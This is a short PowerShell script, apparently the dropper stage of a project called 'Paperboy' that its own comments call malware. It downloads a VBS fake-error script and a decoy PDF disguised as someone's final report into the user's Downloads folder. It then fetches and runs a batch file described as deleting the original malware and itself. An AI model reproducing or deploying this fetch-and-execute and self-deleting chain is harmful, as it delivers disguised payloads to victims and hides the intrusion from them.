# pi.PS1

#go to the user's downloads folder
cd c:\Users\$env:username\Downloads

#downloads the error window script
Invoke-WebRequest -Uri "https://github.com/hanselopolis/Paperboy/blob/main/paperduck_error.vbs?raw=true" -OutFile "c:\Users\$env:username\Downloads\paperduck_error.vbs"

#downloads the error window script
Invoke-WebRequest -Uri "https://github.com/hanselopolis/Paperboy/blob/main/placeholder.pdf?raw=true" -OutFile "c:\Users\$env:username\Downloads\HAmelang_final_report.pdf"

#$fileFind = gci -recurse "paperboy.exe" -ErrorAction SilentlyContinue
#$fileLocation = $fileFind.DirectoryName
#echo $fileLocation > location.txt
#cd $fileLocation

#downloads the batch file that deletes the original malware and itself
Invoke-WebRequest -Uri "https://github.com/hanselopolis/Paperboy/blob/main/test.bat?raw=true" -OutFile ".\test.bat"

#this was ised in testing to confirm which batchfile was being downloaded
#cat test.bat > testbat.txt

#run the deletion batch file
./test.bat

exit